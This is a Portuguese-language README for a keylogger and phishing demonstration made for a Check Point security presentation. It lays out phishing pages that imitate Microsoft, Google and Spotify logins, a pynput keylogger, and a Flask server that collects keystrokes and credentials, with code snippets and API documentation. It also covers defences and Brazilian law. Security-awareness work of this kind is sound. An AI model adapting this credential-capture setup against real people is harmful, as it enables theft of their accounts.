# 🔐 Keylogger Educacional - Demonstração Check Point

![Python Version](https://img.shields.io/badge/python-3.8%2B-blue)
![Status](https://img.shields.io/badge/status-educational-orange)
![Platform](https://img.shields.io/badge/platform-Windows%20%7C%20Linux%20%7C%20MacOS-lightgrey)

## 📋 Sobre o Projeto

Este projeto foi desenvolvido exclusivamente para **fins educacionais e de demonstração** como parte de uma apresentação sobre segurança cibernética para a Check Point. O objetivo é demonstrar como ataques de phishing e keylogging funcionam, aumentando a conscientização sobre essas ameaças.

### ⚠️ AVISO IMPORTANTE

**Este projeto é apenas para fins educacionais!** O uso deste software para atividades maliciosas é **ILEGAL** e **ANTIÉTICO**. O desenvolvedor não se responsabiliza por qualquer uso indevido desta ferramenta.

## 🏗️ Arquitetura do Sistema

O projeto consiste em três componentes principais:

```
┌─────────────────┐         ┌─────────────────┐         ┌─────────────────┐
│                 │         │                 │         │                 │
│  Página Phishing│────────▶│   Keylogger     │────────▶│  Servidor API   │
│   (Frontend)    │         │    (Cliente)    │         │   (Backend)     │
│                 │         │                 │         │                 │
└─────────────────┘         └─────────────────┘         └─────────────────┘
       HTML/CSS/JS              Python Script             Flask API
```

### Componentes:

1. **Páginas de Phishing**: Templates HTML que simulam páginas de login conhecidas
2. **Keylogger**: Script Python que captura teclas pressionadas
3. **Servidor API**: Backend Flask que recebe e armazena os dados capturados

## 🎭 Templates de Phishing

O projeto inclui três templates profissionais de phishing para demonstração:

### 📧 Template Microsoft
![Microsoft Template](assets/Microsoft%20Template.png)
*Template que simula a página de login da Microsoft 365*

### 🔍 Template Google
![Google Template](assets/Google%20Template.png)
*Template que simula a página de login do Google*

### 🎵 Template Spotify
![Spotify Template](assets/Spotify%20Template.png)
*Template que simula a página de login do Spotify*

## 🚀 Instalação

### Pré-requisitos

- Python 3.8 ou superior
- pip (gerenciador de pacotes Python)
- Navegador web moderno

### Passo 1: Clone o Repositório

```bash
git clone https://github.com/duarteHiago/keylogger-apresentacao-chkp-.git
cd keylogger-apresentacao-chkp-
```

### Passo 2: Instale as Dependências

```bash
pip install -r requirements.txt
```

#### Dependências necessárias:
- `pynput`: Para captura de teclas
- `flask`: Framework web para o servidor API
- `flask-cors`: Para permitir requisições cross-origin
- `requests`: Para envio de dados HTTP

### Passo 3: Configure o Servidor

Edite o arquivo `keylogger.py` e configure o endereço do servidor:

```python
SERVER_URL = "http://localhost:5000/api/keylog"
```

### Passo 4: Inicie o Servidor API

```bash
python server.py
```

O servidor estará disponível em `http://localhost:5000`

### Passo 5: Execute o Keylogger (Apenas para Demonstração)

```bash
python keylogger.py
```

### Passo 6: Abra a Página de Phishing

Abra qualquer um dos arquivos HTML no navegador:
- `microsoft-phishing.html`
- `google-phishing.html`
- `spotify-phishing.html`

## 🔍 Como Funciona

### 1. Página de Phishing

As páginas de phishing são réplicas visuais de páginas legítimas de login. Quando a vítima insere credenciais:

```javascript
// Captura o formulário
form.addEventListener('submit', function(e) {
    e.preventDefault();
    // Envia dados para o servidor
    fetch('http://localhost:5000/api/credentials', {
        method: 'POST',
        body: JSON.stringify(credentials)
    });
});
```

### 2. Keylogger

O keylogger captura cada tecla pressionada e envia para o servidor:

```python
from pynput import keyboard

def on_press(key):
    try:
        # Captura a tecla
        key_data = str(key.char)
        # Envia para o servidor
        send_to_server(key_data)
    except AttributeError:
        # Teclas especiais
        key_data = str(key)
```

### 3. Servidor API

O servidor recebe e armazena os dados:

```python
@app.route('/api/keylog', methods=['POST'])
def receive_keylog():
    data = request.json
    # Salva os dados
    save_to_file(data)
    return jsonify({'status': 'success'})
```

## 🛡️ Segurança e Proteção

### Como se Proteger Contra Essas Ameaças

![Check Point Harmony](assets/Harmony.png)

1. **Use Soluções de Segurança Robustas**
   - Check Point Harmony Endpoint
   - Antivírus atualizados
   - Firewall configurado

2. **Educação e Conscientização**
   - Verifique sempre a URL do site
   - Desconfie de e-mails suspeitos
   - Use autenticação de dois fatores (2FA)

3. **Boas Práticas**
   - Não instale software de fontes desconhecidas
   - Mantenha o sistema operacional atualizado
   - Use senhas fortes e únicas
   - Utilize gerenciadores de senha

4. **Verificações de Segurança**
   - Verifique certificados SSL (HTTPS)
   - Analise o domínio cuidadosamente
   - Desconfie de urgências artificiais

### Detecção de Phishing

**URLs Legítimas vs Falsas:**

✅ `https://login.microsoft.com`  
❌ `http://micros0ft-login.com`

✅ `https://accounts.google.com`  
❌ `http://google-accounts-verify.com`

## 📁 Estrutura do Projeto

```
keylogger-apresentacao-chkp-/
│
├── assets/                      # Recursos visuais
│   ├── Microsoft Template.png
│   ├── Google Template.png
│   ├── Spotify Template.png
│   └── Harmony.png
│
├── templates/                   # Templates de phishing
│   ├── microsoft-phishing.html
│   ├── google-phishing.html
│   └── spotify-phishing.html
│
├── keylogger.py                # Script do keylogger
├── server.py                   # Servidor API Flask
├── requirements.txt            # Dependências Python
├── logs/                       # Diretório de logs (criado automaticamente)
│   ├── keylog.txt
│   └── credentials.txt
│
└── README.md                   # Este arquivo
```

## 📡 Documentação da API

### Endpoints Disponíveis

#### 1. Receber Keylog

**POST** `/api/keylog`

```json
{
  "key": "a",
  "timestamp": "2025-12-17T21:21:11Z",
  "source": "keylogger"
}
```

**Resposta:**
```json
{
  "status": "success",
  "message": "Keylog received"
}
```

#### 2. Receber Credenciais

**POST** `/api/credentials`

```json
{
  "username": "user@example.com",
  "password": "password123",
  "template": "microsoft",
  "timestamp": "2025-12-17T21:21:11Z"
}
```

**Resposta:**
```json
{
  "status": "success",
  "message": "Credentials received"
}
```

#### 3. Obter Logs

**GET** `/api/logs`

**Resposta:**
```json
{
  "keylogs": [...],
  "credentials": [...]
}
```

#### 4. Status do Servidor

**GET** `/api/status`

**Resposta:**
```json
{
  "status": "online",
  "uptime": 3600,
  "version": "1.0.0"
}
```

## ⚖️ Aspectos Legais

### Legislação Brasileira

O uso não autorizado de keyloggers e phishing é crime no Brasil, previsto em:

- **Lei Carolina Dieckmann (12.737/2012)**: Invasão de dispositivo informático
- **Marco Civil da Internet (12.965/2014)**: Proteção de dados e privacidade
- **LGPD (13.709/2018)**: Lei Geral de Proteção de Dados

**Penas:** Reclusão de 3 meses a 1 ano + multa (podendo aumentar conforme agravantes)

### Uso Ético

Este projeto deve ser usado **APENAS**:
- ✅ Em ambientes controlados de teste
- ✅ Com autorização explícita
- ✅ Para fins educacionais
- ✅ Em demonstrações de segurança

**NUNCA:**
- ❌ Contra pessoas sem consentimento
- ❌ Para roubo de informações
- ❌ Em redes públicas ou corporativas
- ❌ Com intenção maliciosa

</div>
